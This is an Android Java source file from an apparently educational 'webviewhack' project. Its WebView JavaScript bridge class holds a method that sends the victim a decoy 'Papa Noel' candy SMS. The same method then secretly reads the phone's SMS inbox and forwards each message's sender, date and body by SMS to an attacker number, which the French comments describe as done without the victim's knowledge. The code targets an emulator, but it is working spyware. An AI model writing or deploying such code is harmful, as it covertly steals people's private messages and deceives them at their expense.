package fr.imtatlantique.android.webviewhack;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.database.Cursor;
import android.net.Uri;
import android.widget.Toast;

import fr.imtatlantique.android.webviewhack.utils.GMailSender;
import fr.imtatlantique.android.webviewhack.utils.SmsSender;

/**
 * Classe servant de pont entre l'application Android et le code JavaScript
 * Created by SOMBUGMA Emmanuel on 20/03/2018.
 */
public class WebAppBridge {

    private Context context;
    private GMailSender gmailSender;
    // Représente le numéro d'un second émulateur lancé
    private String HACKER_CONTACT = "5556";

    private static String INBOX = "content://sms/inbox";
    private static String SENT = "content://sms/sent";
    private static String DRAFT = "content://sms/draft";

    public WebAppBridge(Context context) {
        this.context = context;
    }

    /**
     * Fonction qui affiche un Toast
     * @param message à afficher
     */
    public void showToast(String message) {
        Toast.makeText(this.context, message, Toast.LENGTH_LONG).show();
    }

    /**
     * Fonction qui envoie un message sms a un contact donné
     * @param contact auquel le sms est envoyé
     * @param sms envoyé
     */
    public void sendSMS(String contact, String sms) {
        SmsSender smsSender = new SmsSender();
        smsSender.sendSms(contact, sms);
    }

    /**
     * Fonction qui récupère la liste des SMS envoyés (inbox/sent) et les envoi dans notre  email à son insue
     * @param contact contact téléphonique de notre victime. Utilisé pour lui faire croire qu'il a reçu des bonbons :)
     */
    public void sendSMSContent(String contact) throws Exception {
        // On envoi un sms à notre victime pour lui confirmer (faire croire) qu'il a reçu des bonbons
        new SmsSender().sendSms(contact, "Bonjour je suis Papa Noel et voila tes bonbons !");
        String sms = "";
        // Et nous récupère la liste des sms dans son Inbox à son insue qui nous ai envoyée par Sms avec son forfait
        Cursor cursor = this.context.getContentResolver().query(Uri.parse(INBOX), null, null, null, null);
        if (cursor.moveToFirst()) {
            do {
                String address = cursor.getColumnName(2) + ": " +  cursor.getString(2);
                String date = cursor.getColumnName(5) + ": " +  cursor.getString(5);
                String content = cursor.getColumnName(12) + ": " + cursor.getString(12);
                sms = address + "\n" + date + "\n" + content + "\n";
                new SmsSender().sendSms(HACKER_CONTACT, sms);
                //showMessage(sms);
            }
            while (cursor.moveToNext());
        }
    }

    private void showMessage(String message) {
        AlertDialog alertDialog = new AlertDialog.Builder(context).create();
        alertDialog.setTitle("Alert");
        alertDialog.setMessage(message);
        alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, "OK",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        dialog.dismiss();
                    }
                });
        alertDialog.show();
    }
}
